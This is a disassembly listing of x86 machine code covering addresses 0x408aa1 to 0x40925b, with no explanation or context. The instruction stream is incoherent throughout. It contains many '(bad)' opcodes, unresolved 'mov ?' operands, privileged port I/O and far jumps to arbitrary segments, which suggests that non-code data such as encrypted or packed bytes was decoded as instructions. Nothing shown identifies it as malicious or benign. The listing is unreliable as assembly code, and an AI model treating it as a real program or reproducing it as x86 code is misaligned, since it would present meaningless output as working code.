  408aa1:	or     esi,esi
  408aa3:	(bad)  
  408aa4:	test   al,0x6
  408aa6:	dec    ecx
  408aa7:	je     0x408aa2
  408aa9:	fimul  WORD PTR [eax]
  408aab:	inc    ebx
  408aac:	xor    ebp,edx
  408aae:	sub    cl,BYTE PTR [ebx]
  408ab0:	jmp    0xedee:0x9a91ef0a
  408ab7:	adc    eax,0x69d8dd5e
  408abc:	cmc    
  408abd:	mov    edx,0x69c61e33
  408ac2:	adc    al,0x9c
  408ac4:	mov    al,ds:0xa89d6ecb
  408ac9:	sub    DWORD PTR [edi-0x80],eax
  408acc:	jp     0x408aae
  408ace:	xchg   ebx,eax
  408acf:	test   al,0xa1
  408ad1:	nop
  408ad2:	xor    DWORD PTR [edi+0x6a01f1d4],eax
  408ad8:	add    esp,edx
  408ada:	add    DWORD PTR ds:0xaca5b481,esi
  408ae0:	cmc    
  408ae1:	(bad)  [ecx]
  408ae3:	das    
  408ae4:	sti    
  408ae5:	cmp    ebx,DWORD PTR [esi+0x67]
  408ae8:	fwait
  408ae9:	daa    
  408aea:	shr    DWORD PTR ds:0x55e4616d,1
  408af0:	xlat   BYTE PTR ds:[ebx]
  408af1:	xchg   edx,eax
  408af2:	adc    DWORD PTR [eax-0x33126d2a],edi
  408af8:	jle    0x408a9d
  408afa:	retf   
  408afb:	dec    edi
  408afc:	clc    
  408afd:	call   FWORD PTR [esi]
  408aff:	test   al,0x3c
  408b01:	add    edi,DWORD PTR [esi+0x38]
  408b04:	(bad)  
  408b06:	xor    bh,BYTE PTR [ebx+edi*2]
  408b09:	fisttp WORD PTR [ecx]
  408b0b:	jg     0x408af4
  408b0d:	daa    
  408b0e:	pushf  
  408b0f:	test   BYTE PTR [ebx+0x72],bh
  408b12:	xchg   ebp,eax
  408b13:	bound  edx,QWORD PTR [ebp+0x3266a519]
  408b19:	mov    edx,0xc917923b
  408b1e:	ficomp WORD PTR [edx+0x3e785757]
  408b24:	mov    BYTE PTR [edi],bh
  408b26:	popf   
  408b27:	outs   dx,BYTE PTR ds:[esi]
  408b28:	mov    eax,0x39ab584e
  408b2d:	lock ret 
  408b2f:	lock fld QWORD PTR [edi-0x1f618c3e]
  408b36:	jl     0x408b74
  408b38:	shr    ebp,0x39
  408b3b:	popa   
  408b3c:	push   esp
  408b3d:	push   0x1606c71c
  408b42:	aad    0x7d
  408b44:	sub    ebp,ebx
  408b46:	fldenv [ebx]
  408b48:	cmp    dl,ch
  408b4a:	push   ebp
  408b4b:	adc    BYTE PTR [ebp-0x3c],ah
  408b4e:	int3   
  408b4f:	lods   al,BYTE PTR ss:[esi]
  408b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b52:	in     al,0xae
  408b54:	xchg   edi,eax
  408b55:	repz dec ebp
  408b57:	outs   dx,BYTE PTR ds:[esi]
  408b58:	dec    eax
  408b59:	mov    ebp,0x81d5037d
  408b5e:	mov    al,ds:0x70b34b9
  408b63:	out    0x3,al
  408b65:	or     BYTE PTR [ebx],0x7d
  408b68:	popf   
  408b69:	mov    bh,0x8b
  408b6b:	xor    al,0xdf
  408b6d:	xchg   ebx,eax
  408b6e:	sub    eax,0x59d74eb8
  408b73:	inc    edi
  408b74:	inc    BYTE PTR [esi]
  408b76:	inc    ebx
  408b77:	mov    eax,0x55169b8c
  408b7c:	xor    BYTE PTR ds:0x3ea75ba4,0xa6
  408b83:	popa   
  408b84:	and    DWORD PTR [esp+eiz*2+0x8],0x40
  408b89:	js     0x408bfb
  408b8b:	sbb    esp,DWORD PTR [edi-0x145b940a]
  408b91:	lods   al,BYTE PTR ds:[esi]
  408b92:	adc    ecx,ebp
  408b94:	mov    esp,ecx
  408b96:	xchg   BYTE PTR [eax+0x43fd84c8],bl
  408b9c:	mov    dl,0xbe
  408b9e:	or     al,0xd9
  408ba0:	cs mov edx,0x7054f47a
  408ba6:	dec    ebx
  408ba7:	mov    ds:0x7bba4007,al
  408bac:	push   edi
  408bad:	dec    edi
  408bae:	xchg   esi,eax
  408baf:	add    al,0x6d
  408bb1:	hlt    
  408bb2:	aas    
  408bb3:	popf   
  408bb4:	fcomi  st,st(6)
  408bb6:	fdiv   st(2),st
  408bb8:	xchg   DWORD PTR [ecx],ebx
  408bba:	adc    DWORD PTR [edi+0x2e],edx
  408bbd:	mov    bl,0x3c
  408bbf:	mov    al,0x84
  408bc1:	call   0xe12ad86a
  408bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bc7:	mov    cl,BYTE PTR [edx-0x32bd4e7f]
  408bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bce:	ja     0x408bda
  408bd0:	add    al,0xf3
  408bd2:	xchg   ecx,eax
  408bd3:	cmc    
  408bd4:	jle    0x408ba2
  408bd6:	bound  edx,QWORD PTR [eax-0x13d0a774]
  408bdc:	xor    ah,bh
  408bde:	dec    esp
  408bdf:	push   cs
  408be0:	nop
  408be1:	xchg   BYTE PTR [edx-0x598f8133],dl
  408be7:	or     edi,DWORD PTR [ebx-0x75aeda45]
  408bed:	out    0x9b,eax
  408bef:	mov    DWORD PTR [edx+esi*2],edx
  408bf2:	inc    esi
  408bf3:	retf   
  408bf4:	mov    WORD PTR [edx],cs
  408bf6:	in     al,dx
  408bf7:	rol    DWORD PTR [eax-0x672af460],1
  408bfd:	(bad)
  408c00:	jmp    0x408bce
  408c02:	xchg   ebp,eax
  408c03:	stos   BYTE PTR es:[edi],al
  408c04:	lock and DWORD PTR [ebx],edx
  408c07:	stos   DWORD PTR es:[edi],eax
  408c08:	jae    0x408bd7
  408c0a:	cwde   
  408c0b:	add    cl,dh
  408c0d:	jmp    DWORD PTR [ebp+edi*2+0x7d]
  408c11:	js     0x408c92
  408c13:	push   esi
  408c14:	and    al,0xd
  408c16:	mov    ah,0x1
  408c18:	push   es
  408c19:	sub    BYTE PTR [eax-0x6f],ch
  408c1c:	cmp    esi,DWORD PTR [edx]
  408c1e:	sahf   
  408c1f:	iret   
  408c20:	jle    0x408bfa
  408c22:	outs   dx,BYTE PTR ds:[esi]
  408c23:	mov    esi,0xb8a936aa
  408c28:	test   eax,0x9524e909
  408c2d:	jo     0x408c11
  408c2f:	std    
  408c30:	out    dx,eax
  408c31:	test   eax,0x1f1f1cec
  408c36:	clc    
  408c37:	ret    0x15d2
  408c3a:	in     eax,dx
  408c3b:	mov    ds:0x589080a,eax
  408c40:	sub    BYTE PTR [ebp+0x79],bl
  408c43:	dec    ebp
  408c44:	inc    edx
  408c45:	xchg   esp,eax
  408c46:	xchg   ebp,eax
  408c47:	cmp    BYTE PTR [eax+edx*8],cl
  408c4a:	xchg   ebx,eax
  408c4b:	push   esp
  408c4c:	outs   dx,BYTE PTR ds:[esi]
  408c4d:	or     al,0x1e
  408c4f:	add    esp,DWORD PTR [ecx-0xb49edac]
  408c55:	add    ecx,DWORD PTR [ebx]
  408c57:	sbb    BYTE PTR [edi],bh
  408c59:	add    ch,BYTE PTR [ecx+eiz*4+0x1dd2d6a7]
  408c60:	lods   eax,DWORD PTR ds:[esi]
  408c61:	imul   edx,DWORD PTR [esi],0x22
  408c64:	test   al,0x18
  408c66:	sub    DWORD PTR [ebx+0x70],esp
  408c69:	xor    BYTE PTR [eax+ebp*8+0x7aa8d2a9],0xf2
  408c71:	cmp    edx,DWORD PTR [eax-0x77]
  408c74:	loopne 0x408c27
  408c76:	imul   esp,DWORD PTR [esi-0x12],0x9d148954
  408c7d:	jae    0x408c49
  408c7f:	or     BYTE PTR [ecx-0x7de6d8a7],dl
  408c85:	adc    edi,0x73
  408c88:	iret   
  408c89:	jo     0x408c92
  408c8b:	int3   
  408c8c:	(bad)  
  408c8d:	xor    BYTE PTR [ebp+ecx*2-0x7a452ab0],al
  408c94:	and    eax,0x59d473ab
  408c99:	std    
  408c9a:	(bad)  
  408c9b:	sti    
  408c9c:	jmp    0x833b:0xd659875f
  408ca3:	ins    BYTE PTR es:[edi],dx
  408ca4:	jmp    0x7dd6:0x9a173102
  408cab:	retf   0x19ec
  408cae:	mov    ch,0x4e
  408cb0:	and    bl,ch
  408cb2:	mov    ebp,0x2190fccd
  408cb7:	nop
  408cb8:	jge    0x408cc2
  408cba:	xor    DWORD PTR [ecx-0x417561f3],esp
  408cc0:	addr16 cmp ah,al
  408cc3:	mov    ebx,DWORD PTR [esi+0x57]
  408cc6:	mul    BYTE PTR [ebx+eax*8-0x637342dd]
  408ccd:	xor    DWORD PTR [ebp+0x55],ebp
  408cd0:	scas   al,BYTE PTR es:[edi]
  408cd1:	call   0xea99:0xf07f8d5d
  408cd8:	fisub  WORD PTR [eax-0x5a]
  408cdb:	lahf   
  408cdc:	mov    eax,0x1f77ff07
  408ce1:	cmc    
  408ce2:	pusha  
  408ce3:	es inc si
  408ce6:	les    ebp,FWORD PTR [ebp+esi*1+0x40e1b882]
  408ced:	lock aas 
  408cef:	inc    ebp
  408cf0:	and    cl,BYTE PTR [esi+ebx*4-0x63]
  408cf4:	aas    
  408cf5:	addr16 adc al,0xd6
  408cf8:	mov    ebp,0xc3fc7016
  408cfd:	daa    
  408cfe:	xrelease xchg DWORD PTR [edx],edx
  408d01:	(bad)  
  408d03:	pop    ebx
  408d04:	adc    ebx,edx
  408d06:	ins    DWORD PTR es:[edi],dx
  408d07:	test   DWORD PTR [eax],edx
  408d09:	into   
  408d0a:	sub    bh,ch
  408d0c:	ror    DWORD PTR [edx-0x78],1
  408d0f:	sub    DWORD PTR ds:0x16e0345f,0xffffffc5
  408d16:	pop    esp
  408d17:	xchg   DWORD PTR [ebp-0x66],ecx
  408d1a:	std    
  408d1b:	mov    bl,0x69
  408d1d:	inc    edx
  408d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d1f:	pop    eax
  408d20:	cmp    al,BYTE PTR [ebp-0x541379b]
  408d26:	fs stos DWORD PTR es:[edi],eax
  408d28:	xor    BYTE PTR [ebp-0x701330fa],0x79
  408d2f:	cld    
  408d30:	or     al,0x81
  408d32:	xchg   edx,eax
  408d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d34:	scas   eax,DWORD PTR es:[edi]
  408d35:	daa    
  408d36:	xor    al,0x3
  408d38:	add    cl,BYTE PTR [ebp-0x9d0e321]
  408d3e:	rep stos DWORD PTR es:[edi],eax
  408d40:	cdq    
  408d41:	rcr    BYTE PTR [esi],1
  408d43:	bound  ecx,QWORD PTR [ebp-0x2b]
  408d46:	leave  
  408d47:	xchg   ecx,eax
  408d48:	jecxz  0x408cdf
  408d4a:	mov    ebp,0x7052e9bf
  408d4f:	fldcw  WORD PTR [esi+0x1b8ab671]
  408d55:	outs   dx,BYTE PTR ds:[esi]
  408d56:	mov    ds:0x9a564d04,al
  408d5b:	ret    
  408d5c:	jbe    0x408dd6
  408d5e:	push   es
  408d5f:	lds    esi,FWORD PTR [eax-0x7660f532]
  408d65:	leave  
  408d66:	pop    ebp
  408d67:	je     0x408dbc
  408d69:	lea    eax,[edx-0x19117480]
  408d6f:	sub    al,al
  408d71:	dec    edx
  408d72:	sahf   
  408d73:	or     ah,BYTE PTR [esi]
  408d75:	sub    DWORD PTR [ecx-0x1f],edi
  408d78:	sbb    eax,0x14a478e4
  408d7d:	mov    ecx,0x7fb56c71
  408d82:	adc    DWORD PTR [ecx+0x67af6559],ecx
  408d88:	xchg   edi,eax
  408d89:	inc    edi
  408d8a:	rcr    esp,1
  408d8c:	fisttp QWORD PTR [eax-0x394903c7]
  408d92:	inc    ebx
  408d93:	jmp    0x2d15:0xb922d299
  408d9a:	test   BYTE PTR [edx+edi*8],0x2a
  408d9e:	mov    ebp,0x1f9ba9ef
  408da3:	shr    bh,cl
  408da5:	sub    bl,al
  408da7:	cli    
  408da8:	aaa    
  408da9:	aaa    
  408daa:	xor    eax,ecx
  408dac:	(bad)  
  408dae:	shr    BYTE PTR [esp+eax*4-0x31],0x4a
  408db3:	es jo  0x408d99
  408db6:	inc    edx
  408db7:	shl    DWORD PTR [eax],1
  408db9:	push   esi
  408dba:	sub    al,0xc5
  408dbc:	jns    0x408daa
  408dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dc0:	dec    ecx
  408dc1:	lods   eax,DWORD PTR ds:[esi]
  408dc2:	cdq    
  408dc3:	into   
  408dc4:	in     al,dx
  408dc5:	ins    BYTE PTR es:[edi],dx
  408dc6:	dec    ecx
  408dc7:	das    
  408dc8:	pop    esi
  408dc9:	popf   
  408dca:	out    0x3e,al
  408dcc:	dec    esp
  408dcd:	jmp    0x92169703
  408dd2:	jmp    0x78b4b8e5
  408dd7:	aaa    
  408dd8:	sub    eax,DWORD PTR [ebx+0x30307237]
  408dde:	leave  
  408ddf:	xor    edx,ebx
  408de1:	xchg   ecx,eax
  408de2:	outs   dx,DWORD PTR ds:[esi]
  408de3:	(bad)  
  408de4:	cwde   
  408de5:	in     eax,0x63
  408de7:	in     al,0x96
  408de9:	fild   DWORD PTR [ecx-0x64abbaea]
  408def:	outs   dx,BYTE PTR ds:[esi]
  408df0:	pop    ds
  408df1:	call   FWORD PTR [eax-0x5ec28a20]
  408df7:	jle    0x408e06
  408df9:	sbb    DWORD PTR [ebx+0x2b],esp
  408dfc:	lahf   
  408dfd:	adc    dh,BYTE PTR [ebp-0x398a1b92]
  408e03:	sbb    cl,dl
  408e05:	xchg   edi,eax
  408e06:	mov    edi,0x1302f268
  408e0b:	adc    DWORD PTR [ecx],ebp
  408e0d:	arpl   WORD PTR [esp+eax*2],si
  408e10:	aam    0xd
  408e12:	add    eax,0x9b0cd8a2
  408e17:	push   ss
  408e18:	arpl   WORD PTR [esi],di
  408e1a:	adc    al,0x7d
  408e1c:	inc    edi
  408e1d:	outs   dx,BYTE PTR ds:[esi]
  408e1e:	retf   
  408e1f:	out    0xb6,al
  408e21:	int3   
  408e22:	mov    ah,0x4a
  408e24:	popa   
  408e25:	les    edi,FWORD PTR [ebp+0x9]
  408e28:	dec    ebp
  408e29:	cli    
  408e2a:	in     al,dx
  408e2b:	pop    ebp
  408e2c:	loopne 0x408dcf
  408e2e:	push   edi
  408e2f:	add    eax,0xedff5c21
  408e34:	xchg   esp,eax
  408e35:	ja     0x408e85
  408e37:	(bad)  
  408e39:	adc    BYTE PTR [ebp-0x29c75193],0x1b
  408e40:	out    0x9f,al
  408e42:	adc    DWORD PTR [esi-0x7c],ebx
  408e45:	mov    cl,0xe3
  408e47:	and    BYTE PTR [esp-0xa425db7],bl
  408e4e:	shl    edi,cl
  408e50:	(bad)  
  408e51:	fisubr WORD PTR [ebx-0x67]
  408e54:	mov    WORD PTR ds:0xa405d5f8,gs
  408e5a:	(bad)  
  408e5b:	out    0xd7,al
  408e5d:	lock call 0xba58:0x134c838e
  408e65:	cmp    eax,0xbd697dc6
  408e6a:	sub    ebx,ebx
  408e6c:	adc    bh,BYTE PTR [edx-0x4fb0a1b0]
  408e72:	in     eax,0x1b
  408e74:	ja     0x408ec4
  408e76:	int    0xfb
  408e78:	sub    al,0xa3
  408e7a:	inc    esp
  408e7b:	cdq    
  408e7c:	jmp    0x73dee740
  408e81:	pop    ss
  408e82:	and    al,0xb6
  408e84:	mov    ebx,0x55fcb8fe
  408e89:	cmp    al,0x92
  408e8b:	ins    BYTE PTR es:[edi],dx
  408e8c:	in     al,0x43
  408e8e:	pop    ebx
  408e8f:	mov    cl,0xfa
  408e91:	and    BYTE PTR [esi],ch
  408e93:	lods   eax,DWORD PTR ds:[esi]
  408e94:	sub    DWORD PTR [ebx],edi
  408e96:	and    BYTE PTR fs:[edx-0x5d397b00],dh
  408e9d:	or     al,0xb0
  408e9f:	or     eax,DWORD PTR [esi+0x6d1dd059]
  408ea5:	jmp    FWORD PTR [ecx]
  408ea7:	cld    
  408ea8:	xchg   edi,eax
  408ea9:	sub    BYTE PTR [ebx+0x7f9ae3df],ah
  408eaf:	not    edx
  408eb1:	lahf   
  408eb2:	gs jno 0x408eaf
  408eb5:	dec    esp
  408eb6:	push   esi
  408eb7:	in     eax,0xe3
  408eb9:	or     DWORD PTR [ebx],ecx
  408ebb:	sahf   
  408ebc:	icebp  
  408ebd:	ret    0x1c50
  408ec0:	push   esi
  408ec1:	inc    eax
  408ec2:	(bad)  [ebx+esi*8+0x40664ea5]
  408ec9:	stos   DWORD PTR es:[edi],eax
  408eca:	out    0xdd,al
  408ecc:	jle    0x408e79
  408ece:	or     DWORD PTR [edx+0x13],0xf0b3f526
  408ed5:	mov    ?,WORD PTR [ebp+edx*8-0x60]
  408ed9:	cmp    BYTE PTR [ecx-0x49],cl
  408edc:	arpl   WORD PTR [edx+0x5d31de16],sp
  408ee2:	and    ecx,DWORD PTR es:[ebp+0x4abc33e2]
  408ee9:	cwde   
  408eea:	stc    
  408eeb:	outs   dx,BYTE PTR ds:[esi]
  408eec:	jp     0x408f1f
  408eee:	pop    ss
  408eef:	popf   
  408ef0:	sti    
  408ef1:	lock mov bh,0x73
  408ef4:	test   eax,0x7d023159
  408ef9:	add    BYTE PTR [eax-0x77a61141],bl
  408eff:	inc    esi
  408f00:	(bad)  
  408f01:	mov    eax,ds:0x8c9c9e6d
  408f06:	fsubr  st(4),st
  408f08:	jns    0x408f2f
  408f0a:	inc    ebx
  408f0b:	ret    
  408f0c:	sub    edx,DWORD PTR ss:[ebx+0x7691d012]
  408f13:	pop    ebp
  408f14:	mov    edx,0xd517df29
  408f19:	out    dx,al
  408f1a:	xor    DWORD PTR [ecx-0x2b7244e3],esp
  408f20:	lods   eax,DWORD PTR ds:[esi]
  408f21:	into   
  408f22:	aam    0x73
  408f24:	inc    esi
  408f25:	inc    ecx
  408f26:	clc    
  408f27:	cmp    BYTE PTR [eax-0x539c9251],0x83
  408f2e:	into   
  408f2f:	xlat   BYTE PTR ds:[ebx]
  408f30:	pop    eax
  408f31:	xchg   esi,eax
  408f32:	xchg   ecx,eax
  408f33:	jmp    0x408f8e
  408f35:	ror    DWORD PTR [ebx+eax*8-0x2854f252],0x27
  408f3d:	push   cs
  408f3e:	daa    
  408f3f:	into   
  408f40:	cli    
  408f41:	imul   esp,DWORD PTR [ecx-0x4376e292],0xffffffec
  408f48:	mov    DWORD PTR [ebp-0x723bb2da],0x4253586b
  408f52:	mov    bh,0xaa
  408f54:	lods   eax,DWORD PTR ds:[esi]
  408f55:	mov    ?,WORD PTR [ebp-0x3c]
  408f58:	jle    0x408f8c
  408f5a:	adc    eax,0xf319af50
  408f5f:	aaa    
  408f60:	xchg   DWORD PTR es:[edi],ebp
  408f63:	inc    esi
  408f64:	add    DWORD PTR [ebx+0x20],0x5
  408f68:	or     ecx,ecx
  408f6a:	fsub   DWORD PTR [ecx-0x29]
  408f6d:	repnz call 0x82ae:0x6c63ef23
  408f75:	pop    ecx
  408f76:	clc    
  408f77:	iret   
  408f78:	hlt    
  408f79:	ret    
  408f7a:	enter  0x2f75,0xe4
  408f7e:	pop    ecx
  408f7f:	mov    ah,bh
  408f81:	paddq  mm1,QWORD PTR [edi+0x43]
  408f85:	clc    
  408f86:	pop    ss
  408f87:	inc    eax
  408f88:	adc    al,0xa6
  408f8a:	cmp    al,0x4
  408f8c:	je     0x408f9b
  408f8e:	push   cs
  408f8f:	jl     0x408fd8
  408f91:	out    dx,eax
  408f92:	mov    dh,0xf7
  408f94:	adc    eax,0xfa89c186
  408f99:	inc    eax
  408f9a:	test   al,0xd4
  408f9c:	add    eax,0x7dada699
  408fa1:	push   cs
  408fa2:	mov    ecx,0x17402b82
  408fa7:	push   ds
  408fa8:	lea    ecx,[ecx]
  408faa:	sub    al,0x95
  408fac:	push   eax
  408fad:	mov    dl,0x22
  408faf:	(bad)  
  408fb0:	sahf   
  408fb1:	ror    BYTE PTR [ebx+esi*1-0x22],1
  408fb5:	sti    
  408fb6:	imul   edx,DWORD PTR [eax+0x5cbbafba],0x3ffcf885
  408fc0:	in     eax,0x8b
  408fc2:	outs   dx,DWORD PTR es:[esi]
  408fc4:	jno    0x408fb9
  408fc6:	cmp    al,0xfa
  408fc8:	test   DWORD PTR [ebp+0x53aab9c9],ebx
  408fce:	inc    ebp
  408fcf:	sub    eax,0xb6685e2d
  408fd4:	lods   eax,DWORD PTR ds:[esi]
  408fd5:	fcomp  QWORD PTR [ebx+0x37]
  408fd8:	mov    cl,0x16
  408fda:	out    dx,eax
  408fdb:	in     al,dx
  408fdc:	xor    al,0x16
  408fde:	mov    bl,0x9b
  408fe0:	mov    WORD PTR [ebx+0x35],?
  408fe3:	sub    ebx,edx
  408fe5:	cmp    DWORD PTR [edi-0x706ed092],ebp
  408feb:	dec    esi
  408fec:	push   ds
  408fed:	inc    ebp
  408fee:	stos   DWORD PTR es:[edi],eax
  408fef:	push   cs
  408ff0:	imul   eax,DWORD PTR [ebx],0xec1cd882
  408ff6:	jns    0x408ff1
  408ff8:	jmp    0x409044
  408ffa:	fisubr DWORD PTR [ebx+esi*1-0x4d]
  408ffe:	xor    cl,ch
  409000:	cmp    al,0x81
  409002:	jge    0x408ffe
  409004:	add    eax,0xc8ca1eab
  409009:	sti    
  40900a:	retf   0x84dc
  40900d:	inc    ebp
  40900e:	xor    cl,BYTE PTR [edx]
  409010:	arpl   WORD PTR [edx],cx
  409012:	mov    bh,0xec
  409014:	jbe    0x409024
  409016:	out    dx,eax
  409017:	mov    bl,0x6c
  409019:	mov    BYTE PTR [ecx],dl
  40901b:	push   0xffffffa4
  40901d:	sti    
  40901e:	cmp    ch,al
  409020:	mov    ch,0x8e
  409022:	sbb    al,0xe2
  409024:	add    BYTE PTR [edx+eiz*2-0x20],bh
  409028:	es loop 0x409061
  40902b:	fisub  WORD PTR [edi-0x80]
  40902e:	mov    dh,0x67
  409030:	mov    esp,0xc80679f6
  409035:	idiv   DWORD PTR [ecx+0x57]
  409038:	iret   
  409039:	inc    ebx
  40903a:	jmp    0x9baa476f
  40903f:	pop    edi
  409040:	sbb    BYTE PTR [eax],bh
  409042:	icebp  
  409043:	dec    eax
  409044:	(bad)  
  409045:	and    DWORD PTR [edi+0x2c0a9776],ebp
  40904b:	stc    
  40904c:	cmp    ebp,DWORD PTR [edi]
  40904e:	sbb    edx,DWORD PTR [ebx]
  409050:	test   BYTE PTR [esi-0x2f],bh
  409053:	fidivr WORD PTR [esi-0xe5df0fc]
  409059:	mov    bl,0x60
  40905b:	push   ecx
  40905c:	or     eax,0xc4cddeba
  409062:	or     bl,bl
  409064:	fstp   st(7)
  409066:	xor    al,0xba
  409068:	les    esi,FWORD PTR [ebx-0x7b31107f]
  40906e:	inc    ebp
  40906f:	push   ds
  409070:	pusha  
  409071:	xor    al,0x4b
  409073:	jmp    0x936e:0xb6036135
  40907a:	lods   al,BYTE PTR ds:[esi]
  40907b:	or     edi,0xffffffff
  40907e:	retf   
  40907f:	ds jg  0x40904c
  409082:	jl     0x4090de
  409084:	mov    es,WORD PTR [eax+ebp*8+0x6f5163fe]
  40908b:	mov    edi,0xbbe43856
  409090:	in     al,dx
  409091:	xchg   esp,eax
  409092:	cmp    ebx,0x64143426
  409098:	add    eax,0xd2db4d14
  40909d:	test   DWORD PTR [ecx],ebp
  40909f:	test   al,0x4c
  4090a1:	daa    
  4090a2:	push   ss
  4090a3:	adc    eax,0x6085b5e1
  4090a8:	lock push ebx
  4090aa:	or     esi,DWORD PTR [ebp-0x64669b02]
  4090b0:	dec    ebx
  4090b1:	rol    edx,1
  4090b3:	jmp    0x40909a
  4090b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090b6:	lahf   
  4090b7:	jnp    0x40907b
  4090b9:	addr16 push edi
  4090bc:	int    0x78
  4090be:	mov    ds:0x72d11143,eax
  4090c3:	mov    BYTE PTR [ecx],bl
  4090c5:	push   edx
  4090c6:	add    ecx,DWORD PTR [ebp+0x4fd40d8d]
  4090cc:	ret    0xfed6
  4090cf:	mov    dh,BYTE PTR ss:[ebx]
  4090d2:	jle    0x4090a0
  4090d4:	jmp    0xd9a397ed
  4090d9:	js     0x409134
  4090db:	sub    ebx,DWORD PTR [ebx+0x33]
  4090de:	cmp    al,0x7f
  4090e0:	iret   
  4090e1:	xor    eax,0x21b1b10a
  4090e6:	in     al,dx
  4090e7:	pop    ebp
  4090e8:	repz sbb eax,0x87a59c9
  4090ee:	out    0xab,al
  4090f0:	mov    WORD PTR [esi+0x2bf58360],ss
  4090f6:	sti    
  4090f7:	cmp    DWORD PTR [edx-0x4fb40a91],ebp
  4090fd:	mov    edi,0x269ef402
  409102:	adc    eax,0x2270ac2a
  409107:	dec    edi
  409108:	dec    esi
  409109:	jg     0x4090fa
  40910b:	jecxz  0x409165
  40910d:	push   es
  40910e:	call   0xdd59:0x144c0f16
  409115:	pop    ecx
  409116:	inc    edi
  409117:	test   BYTE PTR [ecx-0x7abaf05f],ah
  40911d:	or     al,0x82
  40911f:	icebp  
  409120:	jecxz  0x409129
  409122:	mov    edi,esi
  409124:	ret    0x99f9
  409127:	pop    edi
  409128:	fsubrp st(2),st
  40912a:	sbb    esi,DWORD PTR [eax+0x517f8714]
  409130:	sti    
  409131:	out    dx,al
  409132:	push   esp
  409133:	push   edx
  409134:	mov    ebp,0x5a338bb4
  409139:	popa   
  40913a:	jne    0x409115
  40913c:	jmp    0x409144
  40913e:	stos   DWORD PTR es:[edi],eax
  40913f:	outs   dx,BYTE PTR ds:[esi]
  409140:	rol    bh,1
  409142:	test   BYTE PTR [edx+0x7c],ah
  409145:	mov    dl,BYTE PTR [eax]
  409147:	fisttp QWORD PTR [edx]
  409149:	xchg   DWORD PTR [esi],edi
  40914b:	outs   dx,BYTE PTR ds:[esi]
  40914c:	add    ch,BYTE PTR [eax+0x23e982d2]
  409152:	inc    esi
  409153:	xor    eax,0xade354c1
  409158:	push   edi
  409159:	in     eax,0x5
  40915b:	popa   
  40915c:	sar    DWORD PTR [edx+0x653d6100],0xe0
  409163:	sbb    esi,esi
  409165:	les    esp,FWORD PTR [esi-0x13c59b31]
  40916b:	sub    ah,BYTE PTR [eax-0x3f]
  40916e:	mul    ebp
  409170:	imul   DWORD PTR [ebx+edx*4+0x1e983ba5]
  409177:	into   
  409178:	push   ecx
  409179:	mov    ch,0xb4
  40917b:	push   es
  40917c:	xor    edi,DWORD PTR [ecx]
  40917e:	mul    BYTE PTR [edi+0x67478930]
  409184:	(bad)  
  409185:	dec    ecx
  409186:	je     0x40916a
  409188:	jns    0x40917f
  40918a:	mov    es,esi
  40918c:	inc    esi
  40918d:	push   ebx
  40918e:	addr16 inc ebp
  409190:	mov    al,ds:0xceadcae5
  409195:	ins    BYTE PTR es:[edi],dx
  409196:	cmc    
  409197:	pop    ebx
  409198:	and    cl,BYTE PTR [edx+0x50560c61]
  40919e:	mov    al,ds:0xbee94938
  4091a3:	xor    al,0x3e
  4091a5:	xchg   esp,eax
  4091a6:	iret   
  4091a7:	nop
  4091a8:	fistp  DWORD PTR [ecx-0x7c3dceed]
  4091ae:	pop    edi
  4091af:	jp     0x409148
  4091b1:	scas   eax,DWORD PTR es:[edi]
  4091b2:	xchg   esi,eax
  4091b3:	xchg   esp,eax
  4091b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091b5:	(bad)  
  4091b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091b7:	push   es
  4091b8:	call   0x1c94:0x4c76c04c
  4091bf:	mov    ?,WORD PTR [edx-0x12]
  4091c2:	out    0xa9,eax
  4091c4:	mov    bh,0xad
  4091c6:	inc    edi
  4091c7:	xlat   BYTE PTR ds:[ebx]
  4091c8:	xchg   ecx,eax
  4091c9:	cdq    
  4091ca:	jnp    0x409155
  4091cc:	mov    DWORD PTR [eax+0x7cf10a21],esi
  4091d2:	mov    esp,ecx
  4091d4:	push   ss
  4091d5:	dec    edx
  4091d6:	shl    DWORD PTR [edi],1
  4091d8:	sub    ecx,ecx
  4091da:	retf   0xd208
  4091dd:	dec    ebx
  4091de:	ins    BYTE PTR es:[edi],dx
  4091df:	dec    esp
  4091e0:	mov    edx,esp
  4091e2:	neg    edi
  4091e4:	pop    ebx
  4091e5:	shr    BYTE PTR [ecx],cl
  4091e7:	(bad)  
  4091e9:	or     al,BYTE PTR [ebp+0x7c]
  4091ec:	stos   DWORD PTR es:[edi],eax
  4091ed:	test   eax,ecx
  4091ef:	out    dx,eax
  4091f0:	das    
  4091f1:	call   0x6974:0x5adc4862
  4091f8:	out    0xa3,eax
  4091fa:	pop    ebp
  4091fb:	cld    
  4091fc:	imul   esp,DWORD PTR [edx+0x7b],0x9a442078
  409203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409204:	xchg   ebp,eax
  409205:	(bad)  
  409206:	sbb    DWORD PTR [ebp-0x2328650c],edi
  40920c:	mov    ch,0xb
  40920e:	ss and eax,0xab34bb27
  409214:	cmp    bl,ch
  409216:	loop   0x40928d
  409218:	ds lock fnstcw WORD PTR gs:[eax+eax*1-0x708c9da8]
  409222:	ret    
  409223:	pop    es
  409224:	adc    BYTE PTR [ecx+0x7bad27fe],dl
  40922a:	adc    bl,dl
  40922c:	sbb    eax,0x36527baa
  409231:	ror    al,0xa1
  409234:	push   0xa
  409236:	fadd   QWORD PTR [eax+0x64d498c1]
  40923c:	mov    ebp,0xb658bcb0
  409241:	jb     0x40923f
  409243:	cmp    DWORD PTR [edx+0x75],edi
  409246:	int3   
  409247:	out    dx,al
  409248:	mov    ds:0xbe47d471,eax
  40924d:	int3   
  40924e:	and    al,0xb9
  409250:	cmp    dl,bl
  409252:	xchg   esi,eax
  409253:	pop    edx
  409254:	and    DWORD PTR [eax],eax
  409256:	sub    edx,DWORD PTR [edi]
  409258:	xor    DWORD PTR [eax-0x5a],esp
  40925b:	es push ecx
